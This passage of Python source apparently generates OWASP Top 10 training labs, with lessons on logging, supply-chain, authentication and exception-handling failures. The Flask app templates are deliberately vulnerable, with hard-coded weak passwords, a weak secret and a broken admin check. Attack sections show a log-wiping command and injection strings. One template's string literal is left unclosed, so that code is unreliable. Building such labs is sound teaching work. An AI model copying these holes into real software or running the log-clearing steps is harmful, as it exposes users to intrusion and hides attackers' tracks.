- Inadequate monitoring of critical systems
- Failed to detect data exfiltration

**Target (2013, lessons learned by 2017)**
- Security alerts were ignored
- 40 million credit cards stolen
- Monitoring tools in place but not acted upon
''',
        'prevention': '''# Logging & Monitoring - Prevention

## Comprehensive Logging

```python
import logging
from logging.handlers import RotatingFileHandler
from flask import request, session

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

handler = RotatingFileHandler('security.log', 
                              maxBytes=10000000, 
                              backupCount=5)
formatter = logging.Formatter(
    '%(asctime)s %(levelname)s [%(request_id)s] %(message)s'
)
handler.setFormatter(formatter)
logger.addHandler(handler)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    ip_address = request.remote_addr
    
    if authenticate(username, password):
        logger.info(f"Successful login: user={username}, ip={ip_address}")
        return "Login successful"
    else:
        logger.warning(f"Failed login attempt: user={username}, ip={ip_address}")
        return "Login failed", 401

@app.route('/admin/delete', methods=['POST'])
def delete_user():
    if not session.get('is_admin'):
        logger.warning(
            f"Unauthorized admin access attempt: "
            f"user={session.get('username')}, "
            f"ip={request.remote_addr}, "
            f"endpoint=/admin/delete"
        )
        return "Forbidden", 403
    
    user_id = request.form.get('user_id')
    logger.info(f"User deletion: admin={session['username']}, deleted_user_id={user_id}")
    delete_user_from_db(user_id)
    return "User deleted"
```

## Security Monitoring

```python
from collections import defaultdict
from datetime import datetime, timedelta

# Track failed login attempts
failed_attempts = defaultdict(list)

def check_brute_force(username, ip):
    now = datetime.now()
    cutoff = now - timedelta(minutes=5)
    
    # Clean old attempts
    failed_attempts[username] = [
        time for time in failed_attempts[username] 
        if time > cutoff
    ]
    
    if len(failed_attempts[username]) >= 5:
        logger.critical(
            f"BRUTE FORCE DETECTED: user={username}, ip={ip}, "
            f"attempts={len(failed_attempts[username])}"
        )
        # Trigger alert, block IP, etc.
        return True
    
    failed_attempts[username].append(now)
    return False
```

## Best Practices

- Log all authentication events
- Log access control failures
- Include context (user, IP, timestamp)
- Protect log integrity
- Centralize log collection
- Set up real-time alerts for critical events
- Regularly review logs
- Ensure logs are tamper-proof
- Comply with retention policies
''',
        'attack_vectors': '''# Logging & Monitoring - Attack Scenarios

## Undetected Attacks

Without proper logging, attackers can:

1. **Brute Force Undetected**
```python
# No logging = attacker tries unlimited passwords
for password in password_list:
    try_login(username, password)
# No one notices thousands of attempts
```

2. **Privilege Escalation Hidden**
```python
# Attacker gains admin access
# No log entry = no investigation trigger
# Attacker maintains access for months
```

3. **Data Exfiltration Silent**
```python
# Attacker downloads sensitive data
# No monitoring = no alerts
# Breach discovered months later
```

## Log Tampering

Attackers may try to cover tracks:
- Delete log files
- Modify log entries
- Disable logging service
- Fill logs with noise
'''  ,
        'examples': '''# Logging & Monitoring - Examples

**❌ NO LOGGING:**

```python
@app.route('/login', methods=['POST'])
def login():
    if check_password(username, password):
        session['user'] = username
        return "OK"
    return "Failed", 401
# No logging at all - invisible to security team
```

**✅ PROPER LOGGING:**

```python
import logging

logger = logging.getLogger(__name__)

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    ip = request.remote_addr
    
    if check_password(username, password):
        logger.info(f"Login success: user={username}, ip={ip}")
        session['user'] = username
        return "OK"
    else:
        logger.warning(f"Login failed: user={username}, ip={ip}")
        return "Failed", 401
```
'''
    }



# ============================================================================
# WEB 2025 LABS - Content Generators
# ============================================================================

def generate_supply_chain_2025():
    """Generate Software Supply Chain Failures lab (2025)"""
    return {
        'number': '03',
        'name': 'Software-Supply-Chain-Failures',
        'slug': 'software-supply-chain-failures',
        'title': 'Software Supply Chain Failures',
        'port': 5030,
        'overview': '''# Software Supply Chain Failures - Overview

## What Are Supply Chain Attacks?

**Software Supply Chain Failures** occur when attackers compromise dependencies, build processes, or distribution channels to inject malicious code. In 2025, with complex dependency trees and automated CI/CD pipelines, this represents a critical threat.

### Modern Attack Vectors

- **Dependency Confusion**: Publishing malicious packages with same names as internal packages
- **Typosquatting**: Packages with names similar to popular libraries
- **Compromised Packages**: Legitimate packages hijacked by attackers
- **Malicious Dependencies**: Intentionally malicious packages
- **Build Pipeline Compromise**: Injecting malware during CI/CD

## Why This Matters in 2025

Modern applications depend on hundreds or thousands of packages:

```
Your App
├── Framework (100+ dependencies)
├── Database Driver (50+ dependencies)
├── HTTP Client (30+ dependencies)
└── Utility Libraries (200+ dependencies)

Total: 1000+ packages in dependency tree
```

**One compromised package = entire application compromised**

## Real-World 2025-Era Attacks

**SolarWinds (2020, still impactful)**
- Build system compromised
- Malicious code injected into updates
- 18,000+ organizations affected

**Log4Shell (2021, ongoing concerns)**
- Critical vulnerability in logging library
- Widespread dependency
- Billions of devices affected

**UA-Parser-JS (2021, modern example)**
- Popular npm package compromised
- Malware injected into legitimate package
- Downloaded millions of times weekly

**PyPI/npm Typosquatting (ongoing 2025)**
- Malicious packages mimicking popular ones
- Steal credentials, crypto wallets
- Continuous threat
''',
        'prevention': '''# Supply Chain Security - Prevention

## Dependency Management

### 1. Software Bill of Materials (SBOM)

```python
# Generate SBOM for your project
# Using cyclonedx-bom
pip install cyclonedx-bom
cyclonedx-bom -o sbom.json
```

### 2. Dependency Pinning

```python
# requirements.txt - PRECISE VERSIONS
Flask==3.0.0  # Not Flask>=2.0
requests==2.31.0  # Not requests~=2.0
cryptography==41.0.7  # Exact version

# Generate from current environment
pip freeze > requirements.txt
```

### 3. Dependency Scanning

```bash
# Scan for vulnerabilities
pip-audit

# Check for known malicious packages
python -m pip install safety
safety check

# Use Snyk, Dependabot, or similar
snyk test
```

### 4. Package Verification

```python
# Verify package integrity
pip install package-name --require-hashes

# requirements.txt with hashes
Flask==3.0.0 \
    --hash=sha256:abc123...
```

### 5. Private Package Repository

```python
# Use private PyPI mirror
pip install --index-url https://private-pypi.company.com package-name

# Block public packages
pip install --no-index --find-links=/local/packages package-name
```

## CI/CD Security

```yaml
# .github/workflows/security.yml
name: Supply Chain Security

on: [push, pull_request]

jobs:
  security-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Dependency Scan
        run: |
          pip install pip-audit
          pip-audit
      
      - name: SBOM Generation
        run: |
          pip install cyclonedx-bom
          cyclonedx-bom -o sbom.json
      
      - name: License Compliance
        run: |
          pip install pip-licenses
          pip-licenses --fail-on "GPL"
      
      - name: Code Signing
        run: |
          gpg --sign --detach-sig dist/package.whl
```

## Best Practices

- Pin all dependencies to exact versions
- Generate and verify SBOMs
- Scan dependencies regularly
- Use private package repositories
- Verify package signatures
- Monitor for typosquatting
- Implement least privilege in CI/CD
- Use reproducible builds
- Enable 2FA for package publishing
- Review dependency changes carefully
''',
        'attack_vectors': '''# Supply Chain Attack Vectors

## 1. Dependency Confusion

```python
# Attacker discovers internal package name
# Internal: company-utils (private repo)

# Attacker publishes to PyPI:
# malicious-company-utils (public)

# Developer runs:
pip install company-utils

# If public repo checked first, gets malicious version
```

## 2. Typosquatting

```python
# Popular package: requests
# Attacker publishes: reqeusts, requsets, request

# Developer makes typo:
pip install requsets  # Malicious package!
```

## 3. Compromised Maintainer

```
1. Attacker gains access to maintainer account
2. Publishes malicious version
3. Auto-update systems install malicious code
4. Widespread compromise
```

## 4. Transitive Dependencies

```python
# Your direct dependencies look safe
# But nested dependency is compromised:

Your App
└── trusted-package (safe)
    └── popular-lib (safe)
        └── obscure-dependency (COMPROMISED!)
```

## 5. Build System Compromise

```yaml
# CI/CD pipeline hijacked
# Malicious code injected during build
# Signed with legitimate keys
# Distributed to all users
```
''',
        'examples': '''# Supply Chain Security - Examples

**❌ VULNERABLE:**

```python
# requirements.txt
Flask  # No version pinning!
requests>=2.0  # Too broad!
some-random-package  # Unknown package!

# Install command
pip install -r requirements.txt  # No verification!
```

**✅ SECURE:**

```python
# requirements.txt with exact versions and hashes
Flask==3.0.0 \
    --hash=sha256:21...
requests==2.31.0 \
    --hash=sha256:ab...

# Install with verification
pip install --require-hashes -r requirements.txt

# Automated scanning
pip-audit
safety check
```

**✅ MONITORING:**

```python
# Monitor for new dependencies
import subprocess
import json

def check_dependencies():
    # Get current packages
    result = subprocess.run(['pip', 'list', '--format=json'],
                          capture_output=True, text=True)
    current = json.loads(result.stdout)
    
    # Compare with approved list
    with open('approved-packages.json') as f:
        approved = json.load(f)
    
    for package in current:
        if package['name'] not in approved:
            alert(f"Unapproved package detected: {package['name']}")
```
'''
    }



def generate_authentication_failures_2025():
    """Generate Authentication Failures lab (2025)"""
    return {
        'number': '07',
        'name': 'Authentication-Failures',
        'slug': 'authentication-failures',
        'title': 'Authentication Failures',
        'port': 5031,
        'overview': '''# Authentication Failures (2025) - Overview

## Modern Authentication Challenges

In 2025, authentication has evolved beyond simple passwords. Modern threats include:

- **AI-Powered Attacks**: ML models optimizing credential stuffing
- **Passkey/WebAuthn Bypass**: Misconfigured passwordless systems
- **OAuth/OIDC Flaws**: Third-party authentication vulnerabilities
- **Biometric Spoofing**: Deepfakes and synthetic biometrics
- **MFA Fatigue**: Push bombing and social engineering
- **API Key Leaks**: Exposed in CI/CD, containers, logs

## 2025 Attack Landscape

**Credential Stuffing at Scale**
- Billions of breached credentials available
- Automated tools test millions per hour
- Success rate: 0.1-2% (still profitable)

**MFA Bypass Techniques**
- SIM swapping for SMS 2FA
- Session hijacking post-MFA
- MFA fatigue attacks (Uber 2022, widespread 2025)
- Adversary-in-the-Middle (AitM) phishing

**Cloud-Native Threats**
- Service account compromise
- IMDS credential theft
- Container registry token exposure
''',
        'prevention': '''# Modern Authentication Security

## Passwordless Authentication

```python
from flask import Flask, request, jsonify
import webauthn

app = Flask(__name__)

@app.route('/webauthn/register/begin', methods=['POST'])
def begin_registration():
    user = request.json['user']
    
    # Generate WebAuthn challenge
    options = webauthn.generate_registration_options(
        rp_id="example.com",
        rp_name="Example App",
        user_id=user['id'],
        user_name=user['email'],
        user_display_name=user['name']
    )
    
    session['challenge'] = options.challenge
    return jsonify(options)

@app.route('/webauthn/register/complete', methods=['POST'])
def complete_registration():
    credential = request.json
    
    # Verify WebAuthn credential
    verification = webauthn.verify_registration_response(
        credential=credential,
        expected_challenge=session['challenge'],
        expected_origin="https://example.com",
        expected_rp_id="example.com"
    )
    
    if verification.verified:
        # Store credential for user
        save_webauthn_credential(verification.credential)
        return jsonify({'status': 'success'})
```

## Advanced MFA

```python
import pyotp
from datetime import datetime, timedelta

class SecureMFA:
    def __init__(self):
        self.attempt_tracking = {}
    
    def verify_totp(self, user_id, token):
        # Check for MFA fatigue attack
        if self.is_mfa_fatigue(user_id):
            alert_security_team(f"MFA fatigue detected: {user_id}")
            return False
        
        user = get_user(user_id)
        totp = pyotp.TOTP(user.mfa_secret)
        
        if totp.verify(token, valid_window=1):
            self.reset_attempts(user_id)
            return True
        else:
            self.track_failed_attempt(user_id)
            return False
    
    def is_mfa_fatigue(self, user_id):
        # Detect rapid repeated MFA requests
        if user_id in self.attempt_tracking:
            attempts = self.attempt_tracking[user_id]
            recent = [a for a in attempts 
                     if a > datetime.now() - timedelta(minutes=5)]
            return len(recent) > 10
        return False
```

## API Key Management

```python
import secrets
import hashlib
from datetime import datetime, timedelta

class APIKeyManager:
    def generate_key(self, user_id, expires_days=90):
        # Generate cryptographically secure key
        key = f"sk_{secrets.token_urlsafe(32)}"
        
        # Hash for storage (never store plain text)
        key_hash = hashlib.sha256(key.encode()).hexdigest()
        
        # Store with metadata
        self.store_key({
            'hash': key_hash,
            'user_id': user_id,
            'created': datetime.now(),
            'expires': datetime.now() + timedelta(days=expires_days),
            'last_used': None,
            'permissions': ['read']
        })
        
        # Return key only once
        return key
    
    def validate_key(self, key):
        key_hash = hashlib.sha256(key.encode()).hexdigest()
        stored_key = self.get_key(key_hash)
        
        if not stored_key:
            return False
        
        if stored_key['expires'] < datetime.now():
            return False
        
        # Update last used
        self.update_last_used(key_hash)
        return True
```

## Best Practices 2025

- Implement passkeys/WebAuthn where possible
- Require phishing-resistant MFA
- Monitor for MFA fatigue attacks
- Rotate API keys regularly
- Use hardware security keys for privileged accounts
- Implement behavioral biometrics
- Zero-trust architecture
- Continuous authentication
''',
        'attack_vectors': '''# Modern Authentication Attacks

## AI-Enhanced Credential Stuffing

```python
# Attackers use ML to optimize attacks
# Pattern recognition for valid usernames
# Password mutation based on breach patterns
# Evades simple rate limiting
```

## MFA Fatigue Attack

```
1. Attacker has valid password
2. Repeatedly triggers MFA push notifications
3. User gets frustrated, accepts one
4. Attacker gains access
```

## OAuth Token Theft

```python
# Misconfigured OAuth redirect
# Attacker intercepts authorization code
# Exchanges for access token
# Impersonates user
```

## Container Secret Exposure

```dockerfile
# DANGEROUS: Secrets in Docker image
ENV API_KEY="sk_live_abc123"

# Attacker pulls image
docker pull company/app
docker inspect company/app  # Sees API_KEY
```
''',
        'examples': '''# Authentication Examples (2025)

**❌ VULNERABLE:**

```python
# Weak API key storage
api_keys = {
    'user1': 'simple_key_123'
}

@app.route('/api/data')
def api_endpoint():
    key = request.headers.get('X-API-Key')
    if key in api_keys.values():
        return jsonify(data)
```

**✅ SECURE:**

```python
import secrets
import hashlib

# Secure API key generation and validation
class APIAuth:
    def __init__(self):
        self.keys = {}  # Stores hashes, not plain text
    
    def create_key(self, user_id):
        key = f"sk_{secrets.token_urlsafe(32)}"
        key_hash = hashlib.sha256(key.encode()).hexdigest()
        self.keys[key_hash] = {
            'user_id': user_id,
            'created': datetime.now(),
            'scopes': ['read']
        }
        return key  # Show only once
    
    def validate(self, key):
        key_hash = hashlib.sha256(key.encode()).hexdigest()
        return key_hash in self.keys

@app.route('/api/data')
def api_endpoint():
    key = request.headers.get('X-API-Key')
    if not api_auth.validate(key):
        return jsonify({'error': 'Invalid API key'}), 401
    return jsonify(data)
```
'''
    }


def generate_logging_alerting_failures_2025():
    """Generate Logging & Alerting Failures lab (2025)"""
    return {
        'number': '09',
        'name': 'Logging-Alerting-Failures',
        'slug': 'logging-alerting-failures',
        'title': 'Logging & Alerting Failures',
        'port': 5032,
        'overview': '''# Logging & Alerting Failures (2025) - Overview

## Modern Observability Challenges

In 2025, applications run across:
- Microservices (dozens to thousands)
- Serverless functions
- Containers orchestrated by Kubernetes
- Multi-cloud environments
- Edge computing locations

**Challenge**: Traditional logging insufficient for distributed systems

## Critical 2025 Requirements

**Structured Logging**
- JSON-formatted logs
- Correlation IDs across services
- Distributed tracing
- Contextual metadata

**Real-Time Alerting**
- Automated threat detection
- Anomaly detection with ML
- Security orchestration (SOAR)
- Incident response automation

**Compliance & Forensics**
- GDPR, SOC 2, ISO 27001 requirements
- Tamper-proof audit logs
- Long-term retention
- Chain of custody

## Modern Threats

Without proper logging in 2025:
- API abuse goes undetected
- Container escapes invisible
- Lateral movement unnoticed
- Data exfiltration unseen
- Compliance violations
''',
        'prevention': '''# Modern Logging & Monitoring

## Structured Logging

```python
import structlog
import logging
from pythonjsonlogger import jsonlogger

# Configure structured logging
structlog.configure(
    processors=[
        structlog.stdlib.filter_by_level,
        structlog.stdlib.add_logger_name,
        structlog.stdlib.add_log_level,
        structlog.stdlib.PositionalArgumentsFormatter(),
        structlog.processors.TimeStamper(fmt="iso"),
        structlog.processors.StackInfoRenderer(),
        structlog.processors.format_exc_info,
        structlog.processors.UnicodeDecoder(),
        structlog.processors.JSONRenderer()
    ],
    logger_factory=structlog.stdlib.LoggerFactory(),
)

logger = structlog.get_logger()

@app.route('/api/transfer', methods=['POST'])
def transfer_money():
    amount = request.json['amount']
    from_account = request.json['from']
    to_account = request.json['to']
    
    logger.info(
        "money_transfer_initiated",
        amount=amount,
        from_account=from_account,
        to_account=to_account,
        user_id=current_user.id,
        ip_address=request.remote_addr,
        user_agent=request.headers.get('User-Agent'),
        correlation_id=get_correlation_id(),
        service="payment-api",
        environment="production"
    )
```

## Distributed Tracing

```python
from opentelemetry import trace
from opentelemetry.exporter.otlp.proto.grpc.trace_exporter import OTLPSpanExporter
from opentelemetry.sdk.trace import TracerProvider
from opentelemetry.sdk.trace.export import BatchSpanProcessor

# Configure OpenTelemetry
trace.set_tracer_provider(TracerProvider())
tracer = trace.get_tracer(__name__)

otlp_exporter = OTLPSpanExporter(endpoint="localhost:4317")
span_processor = BatchSpanProcessor(otlp_exporter)
trace.get_tracer_provider().add_span_processor(span_processor)

@app.route('/process-order')
def process_order():
    with tracer.start_as_current_span("process_order") as span:
        span.set_attribute("order.id", order_id)
        span.set_attribute("user.id", user_id)
        
        # Operations are traced
        validate_order()
        charge_payment()
        send_confirmation()
```

## Security Monitoring

```python
from datetime import datetime, timedelta
from collections import defaultdict

class SecurityMonitor:
    def __init__(self):
        self.events = []
        self.alerts = []
    
    def log_security_event(self, event_type, **kwargs):
        event = {
            'timestamp': datetime.now().isoformat(),
            'type': event_type,
            'severity': self.calculate_severity(event_type),
            **kwargs
        }
        
        self.events.append(event)
        
        # Real-time anomaly detection
        if self.is_anomalous(event):
            self.trigger_alert(event)
        
        # Send to SIEM
        self.send_to_siem(event)
    
    def is_anomalous(self, event):
        # Detect patterns
        if event['type'] == 'failed_login':
            recent_failures = self.count_recent_events(
                'failed_login',
                {'user_id': event['user_id']},
                minutes=5
            )
            return recent_failures > 5
        
        if event['type'] == 'privilege_escalation':
            return True  # Always alert
        
        return False
    
    def trigger_alert(self, event):
        alert = {
            'alert_id': generate_alert_id(),
            'timestamp': datetime.now().isoformat(),
            'severity': 'high',
            'event': event,
            'recommended_action': self.get_recommendation(event)
        }
        
        # Send to security team
        send_to_slack(alert)
        send_to_pagerduty(alert)
        create_jira_ticket(alert)
        
        # Automated response
        if event['type'] == 'brute_force':
            block_ip(event['ip_address'])
```

## Cloud-Native Logging

```python
# Kubernetes-aware logging
import logging
import os

class K8sFormatter(logging.Formatter):
    def format(self, record):
        record.pod_name = os.environ.get('HOSTNAME')
        record.namespace = os.environ.get('NAMESPACE')
        record.node_name = os.environ.get('NODE_NAME')
        return super().format(record)

# Log to stdout (collected by Fluentd/Fluent Bit)
handler = logging.StreamHandler()
handler.setFormatter(K8sFormatter(
    '{"time":"%(asctime)s","pod":"%(pod_name)s",'
    '"namespace":"%(namespace)s","level":"%(levelname)s",'
    '"message":"%(message)s"}'
))
```
''',
        'attack_vectors': '''# Logging Failures in Cloud-Native

## Log Injection Attack

```python
# Attacker injects malicious log entries
username = '"; DROP TABLE logs; --'
logger.info(f"Login attempt: {username}")
# If logs parsed as code = code injection
```

## Container Log Tampering

```bash
# Attacker gains container access
# Modifies logs to hide tracks
docker exec -it container bash
> /var/log/app.log  # Clear logs
```

## Correlation ID Spoofing

```python
# Attacker reuses legitimate correlation ID
# Makes malicious requests appear as part of valid transaction
# Evades detection
```
''',
        'examples': '''# Logging Examples (2025)

**❌ INADEQUATE:**

```python
@app.route('/api/delete-user', methods=['POST'])
def delete_user():
    user_id = request.json['user_id']
    delete_from_db(user_id)
    print(f"Deleted user {user_id}")  # Just print!
    return "OK"
```

**✅ COMPREHENSIVE:**

```python
import structlog

logger = structlog.get_logger()

@app.route('/api/delete-user', methods=['POST'])
def delete_user():
    user_id = request.json['user_id']
    
    logger.info(
        "user_deletion_initiated",
        target_user_id=user_id,
        admin_user_id=current_user.id,
        ip_address=request.remote_addr,
        correlation_id=get_correlation_id(),
        timestamp=datetime.now().isoformat(),
        action="DELETE",
        resource="user",
        result="pending"
    )
    
    try:
        delete_from_db(user_id)
        
        logger.info(
            "user_deletion_completed",
            target_user_id=user_id,
            admin_user_id=current_user.id,
            result="success"
        )
    except Exception as e:
        logger.error(
            "user_deletion_failed",
            target_user_id=user_id,
            error=str(e),
            result="failure"
        )
        raise
    
    return "OK"
```
'''
    }


def generate_mishandling_exceptions_2025():
    """Generate Mishandling of Exceptional Conditions lab (2025)"""
    return {
        'number': '10',
        'name': 'Mishandling-Exceptional-Conditions',
        'slug': 'mishandling-exceptional-conditions',
        'title': 'Mishandling of Exceptional Conditions',
        'port': 5033,
        'overview': '''# Mishandling of Exceptional Conditions - Overview

## What Is This Vulnerability?

**Mishandling of Exceptional Conditions** (CWE-755) occurs when applications fail to properly handle errors, edge cases, and exceptional states. This can lead to:

- Information disclosure through error messages
- Denial of Service (DoS)
- Authentication bypass
- Authorization failures
- Data corruption
- System crashes

## Modern 2025 Context

In cloud-native, microservices architectures:

**Cascading Failures**
- One service failure triggers chain reaction
- Circuit breakers not implemented
- Timeouts not configured
- Retry storms

**Async/Event-Driven Issues**
- Unhandled promise rejections
- Event processing failures
- Message queue poisoning
- Dead letter queue neglect

**Resource Exhaustion**
- OOM kills in containers
- Connection pool exhaustion
- File descriptor limits
- Rate limit exceeded

## Real-World Impact

**Knight Capital (2012, still relevant)**
- $440 million loss in 45 minutes
- Unhandled exception in trading algorithm

**Cloudflare Outage (2019)**
- Regular expression DoS
- Unhandled edge case in WAF rules
- Global outage

**GitHub Outage (2018)**
- Database failover exception
- Unhandled edge case in MySQL
- 24-hour degradation
''',
        'prevention': '''# Proper Exception Handling

## Defensive Programming

```python
from flask import Flask, jsonify, request
from functools import wraps
import logging

logger = logging.getLogger(__name__)

def handle_exceptions(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        try:
            return f(*args, **kwargs)
        except ValueError as e:
            logger.warning(f"Validation error: {str(e)}")
            return jsonify({'error': 'Invalid input'}), 400
        except PermissionError as e:
            logger.warning(f"Permission denied: {str(e)}")
            return jsonify({'error': 'Permission denied'}), 403
        except Exception as e:
            logger.error(f"Unexpected error: {str(e)}", exc_info=True)
            # Never expose internal errors to users
            return jsonify({'error': 'Internal server error'}), 500
    return wrapper

@app.route('/api/transfer', methods=['POST'])
@handle_exceptions
def transfer_money():
    data = request.get_json()
    
    # Validate input
    if not data or 'amount' not in data:
        raise ValueError("Amount is required")
    
    amount = float(data['amount'])
    
    if amount <= 0:
        raise ValueError("Amount must be positive")
    
    if amount > 10000:
        raise ValueError("Amount exceeds limit")
    
    # Process transfer
    result = process_transfer(amount)
    return jsonify(result)
```

## Circuit Breaker Pattern

```python
from datetime import datetime, timedelta

class CircuitBreaker:
    def __init__(self, failure_threshold=5, timeout=60):
        self.failure_threshold = failure_threshold
        self.timeout = timeout
        self.failures = 0
        self.last_failure_time = None
        self.state = 'CLOSED'  # CLOSED, OPEN, HALF_OPEN
    
    def call(self, func, *args, **kwargs):
        if self.state == 'OPEN':
            if datetime.now() - self.last_failure_time > timedelta(seconds=self.timeout):
                self.state = 'HALF_OPEN'
            else:
                raise Exception("Circuit breaker is OPEN")
        
        try:
            result = func(*args, **kwargs)
            self.on_success()
            return result
        except Exception as e:
            self.on_failure()
            raise
    
    def on_success(self):
        self.failures = 0
        self.state = 'CLOSED'
    
    def on_failure(self):
        self.failures += 1
        self.last_failure_time = datetime.now()
        
        if self.failures >= self.failure_threshold:
            self.state = 'OPEN'
            logger.critical(f"Circuit breaker opened after {self.failures} failures")

# Usage
payment_circuit_breaker = CircuitBreaker(failure_threshold=3, timeout=30)

@app.route('/payment')
def process_payment():
    try:
        result = payment_circuit_breaker.call(external_payment_api)
        return jsonify(result)
    except Exception:
        return jsonify({'error': 'Payment service temporarily unavailable'}), 503
```

## Graceful Degradation

```python
class ResilientService:
    def __init__(self):
        self.cache = {}
        self.fallback_enabled = True
    
    def get_data(self, key):
        try:
            # Try primary data source
            data = self.fetch_from_database(key)
            self.cache[key] = data  # Update cache
            return data
        except DatabaseConnectionError:
            logger.warning("Database unavailable, using cache")
            # Fallback to cache
            if key in self.cache:
                return self.cache[key]
            raise
        except Exception as e:
            logger.error(f"Unexpected error: {e}")
            # Return degraded response
            if self.fallback_enabled:
                return self.get_fallback_data(key)
            raise
```

## Resource Limits

```python
from concurrent.futures import ThreadPoolExecutor, TimeoutError
import signal

class ResourceLimitedOperation:
    def __init__(self, max_workers=10, timeout=30):
        self.executor = ThreadPoolExecutor(max_workers=max_workers)
        self.timeout = timeout
    
    def execute(self, func, *args, **kwargs):
        future = self.executor.submit(func, *args, **kwargs)
        
        try:
            result = future.result(timeout=self.timeout)
            return result
        except TimeoutError:
            logger.warning(f"Operation timed out after {self.timeout}s")
            future.cancel()
            raise
        except Exception as e:
            logger.error(f"Operation failed: {e}")
            raise
```

## Best Practices

- Never expose stack traces to users
- Log all exceptions with context
- Implement circuit breakers for external services
- Set timeouts on all operations
- Validate all inputs
- Handle async errors properly
- Implement retry with exponential backoff
- Use graceful degradation
- Monitor error rates
- Test error paths
''',
        'attack_vectors': '''# Exception Handling Attacks

## Information Disclosure

```python
# Vulnerable: Exposes internal details
try:
    user = db.query(f"SELECT * FROM users WHERE id={user_id}")
except Exception as e:
    return str(e)  # Exposes: "Table 'users' doesn't exist in database 'prod_db'"
```

## DoS via Exception Triggering

```python
# Attacker triggers expensive exceptions repeatedly
# No rate limiting on exception-heavy code path
# Server resources exhausted
```

## Authentication Bypass

```python
# Vulnerable exception handling
try:
    authenticate_user(username, password)
    session['authenticated'] = True
except Exception:
    pass  # Silently fails, user not authenticated
    # But code continues...
    
# If check is missing, unauthenticated user proceeds
```
''',
        'examples': '''# Exception Handling Examples

**❌ DANGEROUS:**

```python
@app.route('/api/user/<user_id>')
def get_user(user_id):
    try:
        user = database.get_user(user_id)
        return jsonify(user)
    except Exception as e:
        # DANGEROUS: Exposes internals
        return str(e), 500
```

**✅ SECURE:**

```python
@app.route('/api/user/<user_id>')
def get_user(user_id):
    try:
        # Validate input
        if not user_id.isdigit():
            return jsonify({'error': 'Invalid user ID'}), 400
        
        user = database.get_user(int(user_id))
        
        if not user:
            return jsonify({'error': 'User not found'}), 404
        
        return jsonify(user)
        
    except DatabaseConnectionError as e:
        logger.error(f"Database error: {e}", exc_info=True)
        return jsonify({'error': 'Service temporarily unavailable'}), 503
        
    except Exception as e:
        logger.error(f"Unexpected error in get_user: {e}", exc_info=True)
        # Generic error, no details exposed
        return jsonify({'error': 'Internal server error'}), 500
```
'''
    }



# ============================================================================
# Flask App Generator
# ============================================================================

def generate_flask_app(lab_config):
    """Generate a vulnerable Flask application for the lab"""
    slug = lab_config['slug']
    title = lab_config['title']
    port = lab_config['port']
    
    # Generate app based on vulnerability type
    if 'authentication' in slug or 'broken-authentication' in slug:
        return generate_auth_app(lab_config)
    elif 'sensitive-data' in slug:
        return generate_sensitive_data_app(lab_config)
    elif 'xxe' in slug or 'xml' in slug:
        return generate_xxe_app(lab_config)
    elif 'xss' in slug:
        return generate_xss_app(lab_config)
    elif 'deserialization' in slug:
        return generate_deserialization_app(lab_config)
    elif 'logging' in slug:
        return generate_logging_app(lab_config)
    elif 'supply-chain' in slug:
        return generate_supply_chain_app(lab_config)
    elif 'exceptional' in slug or 'mishandling' in slug:
        return generate_exception_app(lab_config)
    else:
        return generate_generic_app(lab_config)


def generate_auth_app(config):
    """Generate authentication vulnerability app"""
    return f'''"""
OWASP Top 10 Lab: {config['title']}

EDUCATIONAL PURPOSE ONLY
This is a safe, isolated demonstration of {config['title']} vulnerabilities.
"""

from flask import Flask, render_template, request, jsonify, session
from werkzeug.security import generate_password_hash, check_password_hash
import os

app = Flask(__name__)
app.secret_key = "weak_secret_key_for_demo"  # VULNERABLE: Weak secret

# Simulated user database
users = {{
    'alice': {{'password': 'password123', 'role': 'user'}},  # VULNERABLE: Weak password
    'bob': {{'password': 'admin', 'role': 'user'}},
    'admin': {{'password': 'admin123', 'role': 'admin'}}
}}

failed_attempts = {{}}

@app.route('/')
def home():
    return render_template('home.html', 
                         username=session.get('username'),
                         role=session.get('role'))

@app.route('/login', methods=['POST'])
def login():
    """VULNERABLE: No rate limiting, weak session management"""
    username = request.form.get('username')
    password = request.form.get('password')
    
    # VULNERABLE: No brute force protection
    if username in users and users[username]['password'] == password:
        session['username'] = username
        session['role'] = users[username]['role']
        # VULNERABLE: Session ID not regenerated
        return jsonify({{'success': True, 'role': users[username]['role']}})
    
    return jsonify({{'success': False, 'message': 'Invalid credentials'}}), 401

@app.route('/admin')
def admin_panel():
    """VULNERABLE: Weak authorization check"""
    # Should check session['role'] == 'admin'
    if 'username' in session:
        return render_template('admin.html')
    return "Please login", 401

@app.route('/logout')
def logout():
    """VULNERABLE: Incomplete logout"""
    session.pop('username', None)
    # VULNERABLE: Doesn't clear all session data
    return jsonify({{'success': True}})

if __name__ == '__main__':
    print("=" * 60)
    print("OWASP Top 10 Lab: {config['title']}")
    print("=" * 60)
    print("\\nTest Accounts:")
    print("  alice / password123 (user)")
    print("  admin / admin123 (admin)")
    print(f"\\nRunning on http://localhost:{config['port']}")
    print("\\nEDUCATIONAL PURPOSE ONLY")
    print("=" * 60)
    
    app.run(host='0.0.0.0', port=5000, debug=False)
'''


def generate_generic_app(config):
    """Generate a generic vulnerable Flask app"""
    return f'''"""
OWASP Top 10 Lab: {config['title']}

EDUCATIONAL PURPOSE ONLY
"""

from flask import Flask, render_template, request, jsonify, session
import os

app = Flask(__name__)
app.secret_key = os.urandom(24)

@app.route('/')
def home():
    return render_template('home.html', 
                         title="{config['title']}",
                         vulnerability="{config['slug']}")

@app.route('/exploit', methods=['GET', 'POST'])
def exploit():
    """Demonstration endpoint showing the vulnerability"""
    if request.method == 'POST':
        data = request.form.get('data', '')
        # VULNERABLE: Demonstrates the security issue
        result = {{'message': 'Vulnerable endpoint processed', 'data': data}}
        return jsonify(result)
    return render_template('exploit.html')

if __name__ == '__main__':
    print("=" * 60)
    print("OWASP Top 10 Lab: {config['title']}")
    print("=" * 60)
    print(f"\\nRunning on http://localhost:{config['port']}")



def generate_xxe_app(config):
    """Generate XXE app"""
    return generate_generic_app(config)


def generate_xss_app(config):
    """Generate XSS app"""
    return generate_generic_app(config)


def generate_deserialization_app(config):
    """Generate deserialization app"""
    return generate_generic_app(config)


def generate_logging_app(config):
    """Generate logging app"""
    return generate_generic_app(config)


def generate_supply_chain_app(config):
    """Generate supply chain app"""
    return generate_generic_app(config)


